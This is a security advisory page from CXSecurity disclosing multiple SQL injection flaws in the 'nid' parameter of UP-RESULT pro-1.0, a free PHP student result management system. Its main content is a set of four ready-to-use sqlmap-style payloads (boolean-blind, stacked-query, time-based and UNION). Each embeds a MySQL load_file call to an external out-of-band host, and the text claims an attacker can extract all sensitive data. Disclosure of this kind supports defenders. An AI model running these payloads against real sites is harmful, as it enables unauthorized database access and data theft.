---
title: UP-RESULT[pro-1.0] Multiple-SQLi
url: https://cxsecurity.com/issue/WLB-2024100040
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-10-29
fetch_date: 2025-10-06T18:49:16.502265
---

# UP-RESULT[pro-1.0] Multiple-SQLi

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **UP-RESULT[pro-1.0] Multiple-SQLi**  **2024.10.28**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: ****Yes****  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: UP-RESULT[pro-1.0] Multiple-SQLi
## Author: nu11secur1ty
## Date: 10/28/2024
## Vendor: https://mayurik.com/
## Software: https://www.sourcecodester.com/php/15653/best-student-result-management-system-project-source-code-php-and-mysql-free-download
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `nid` parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load\_file('\\\\p2scekbx5ka4v4drqw3isn2svj1cp5dwgk77xvm.tupa\_putka.com\\eej'))+' was submitted in the nid parameter. This payload injects a SQL sub-query that calls MySQL's load\_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed. The attacker can get all sensitive information from this system when he attacks it online!
STATUS: HIGH- Vulnerability
[+]Exploits:
- SQLi Multiple:
```mysql
---
Parameter: nid (GET)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
Payload: nid=2'+(select load\_file('\\\\p2scekbx5ka4v4drqw3isn2svj1cp5dwgk77xvm.tupa\_putka.com\\eej'))+'' OR NOT 9142=9142 AND 'bbjg'='bbjg
Type: stacked queries
Title: MySQL >= 5.0.12 stacked queries (comment)
Payload: nid=2'+(select load\_file('\\\\p2scekbx5ka4v4drqw3isn2svj1cp5dwgk77xvm.tupa\_putka.com\\eej'))+'';SELECT SLEEP(7)#
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: nid=2'+(select load\_file('\\\\p2scekbx5ka4v4drqw3isn2svj1cp5dwgk77xvm.tupa\_putka.com\\eej'))+'' AND (SELECT 9083 FROM (SELECT(SLEEP(7)))YMvG) AND 'jiLE'='jiLE
Type: UNION query
Title: MySQL UNION query (NULL) - 3 columns
Payload: nid=2'+(select load\_file('\\\\p2scekbx5ka4v4drqw3isn2svj1cp5dwgk77xvm.tupa\_putka.com\\eej'))+'' UNION ALL SELECT NULL,CONCAT(0x7178767871,0x6467686f7670716c49467649584a4744416775554961485747416c4b724977454f75787267707268,0x7162627a71),NULL,NULL#
---
```
## Reproduce:
[href](https://www.patreon.com/posts/up-result-pro-1-114856979)
## Demo PoC:
[href](https://www.nu11secur1ty.com/2024/10/up-resultpro-10-multiple-sqli.html)
## Time spent:
01:27:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024100040)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top